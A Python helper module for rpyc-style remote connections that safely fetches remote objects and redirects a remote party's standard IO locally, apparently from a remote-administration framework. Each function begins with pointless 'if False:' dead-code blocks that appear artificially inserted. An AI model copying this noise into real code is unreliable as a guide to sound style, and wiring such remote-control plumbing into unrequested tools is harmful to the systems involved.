import sys
import json
import zlib
import msgpack
from contextlib import contextmanager
from network.lib.rpc.utils.helpers import restricted

def safe_obtain(proxy):
    if False:
        while True:
            i = 10
    " safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. "
    try:
        conn = object.__getattribute__(proxy, '____conn__')()
    except AttributeError:
        ptype = type(proxy)
        if type(proxy) in (tuple, list, set):
            objs = list((safe_obtain(x) for x in proxy))
            return ptype(objs)
        return proxy
    if not hasattr(conn, 'obtain'):
        try:
            setattr(conn, 'obtain', conn.root.msgpack_dumps)
            setattr(conn, 'is_msgpack_obtain', True)
        except:
            setattr(conn, 'obtain', conn.root.json_dumps)
            setattr(conn, 'is_msgpack_obtain', False)
    data = conn.obtain(proxy, compressed=True)
    data = zlib.decompress(data)
    if conn.is_msgpack_obtain:
        data = msgpack.loads(data)
    else:
        try:
            data = data.decode('utf-8')
        except:
            data = data.decode('latin1')
        data = json.loads(data)
    return data

def obtain(proxy):
    if False:
        i = 10
        return i + 15
    return safe_obtain(proxy)

@contextmanager
def redirected_stdo(module, stdout=None, stderr=None):
    if False:
        while True:
            i = 10
    ns = module.client.conn.namespace
    if stdout is None:
        stdout = module.stdout
    if stderr is None:
        stderr = module.stdout
    try:
        ns['redirect_stdo'](restricted(stdout, ['softspace', 'write', 'flush']), restricted(stderr, ['softspace', 'write', 'flush']))
        module.client.conn.register_remote_cleanup(ns['reset_stdo'])
        yield
    finally:
        ns['reset_stdo']()
        module.client.conn.unregister_remote_cleanup(ns['reset_stdo'])

@contextmanager
def redirected_stdio(module, stdout=None, stderr=None):
    if False:
        return 10
    '\n    Redirects the other party\'s ``stdin``, ``stdout`` and ``stderr`` to\n    those of the local party, so remote IO will occur locally.\n\n    Example usage::\n\n        with redirected_stdio(conn):\n            conn.modules.sys.stdout.write("hello\\n")   # will be printed locally\n\n    '
    ns = module.client.conn.namespace
    stdin = sys.stdin
    if stdout is None:
        stdout = module.stdout
    if stderr is None:
        stderr = module.stdout
    try:
        ns['redirect_stdio'](restricted(stdin, ['softspace', 'write', 'readline', 'encoding', 'close']), restricted(stdout, ['softspace', 'write', 'readline', 'encoding', 'close']), restricted(stderr, ['softspace', 'write', 'readline', 'encoding', 'close']))
        module.client.conn.register_remote_cleanup(ns['reset_stdio'])
        yield
    finally:
        ns['reset_stdio']()
        module.client.conn.unregister_remote_cleanup(ns['reset_stdio'])